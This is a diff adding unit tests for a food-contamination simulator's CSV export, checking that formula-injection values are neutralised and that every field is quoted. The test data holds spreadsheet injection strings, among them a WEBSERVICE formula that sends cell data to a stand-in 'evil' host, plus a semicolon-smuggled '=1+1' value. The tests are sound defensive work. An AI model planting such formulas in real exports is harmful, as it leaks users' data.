@@ -581,3 +581,45 @@ class TestBuildCSVExportFormulaNeutralization:
         assert parsed[0]["scenario_name"] == "E. coli O157:H7 in Romaine Lettuce"
         assert parsed[0]["contaminant"] == "E. coli O157:H7"
         assert parsed[0]["time_reduction_percent"] == "96"
+
+    def test_impact_graph_cells_with_formula_prefixes_are_neutralized(self) -> None:
+        import csv as csv_mod
+        import io as io_mod
+
+        sim = self._sim()
+        sim["metrics"]["supply_chain_graph"]["links"] = [
+            {
+                "source": "=evil-source",
+                "target": "+evil-target",
+                "affected": True,
+                "lot_codes": ["=LOT-1", "LOT-2"],
+            },
+        ]
+        out = _build_csv_export(sim, view="impact_graph")
+        parsed = list(csv_mod.DictReader(io_mod.StringIO(out)))
+        assert len(parsed) == 1
+        assert parsed[0]["source"] == "'=evil-source"
+        assert parsed[0]["target"] == "'+evil-target"
+        # lot_codes are joined with "," before sanitizing; the joined cell
+        # starts with "=" so the whole cell is neutralized as one field.
+        assert parsed[0]["lot_codes"] == "'=LOT-1,LOT-2"
+        assert parsed[0]["scenario_name"] == "'=WEBSERVICE(\"http://evil/?x=\"&A1)"
+
+    def test_csv_output_quotes_every_field(self) -> None:
+        import csv as csv_mod
+        import io as io_mod
+
+        sim = self._sim()
+        sim["metrics"]["scenario"] = "E. coli O157:H7 in Romaine Lettuce"
+        sim["metrics"]["contaminant"] = "ok;=1+1"
+        out = _build_csv_export(sim, view="summary")
+        lines = [line for line in out.splitlines() if line]
+        assert len(lines) == 2  # header plus one data row
+        for line in lines:
+            assert line.startswith('"'), f"unquoted CSV line: {line!r}"
+        # The semicolon value stays inside one quoted field and round-trips
+        # as a single cell, so a reader that splits on ";" cannot start a
+        # new cell on the "=".
+        assert '"ok;=1+1"' in lines[1]
+        parsed = list(csv_mod.DictReader(io_mod.StringIO(out)))
+        assert parsed[0]["contaminant"] == "ok;=1+1"
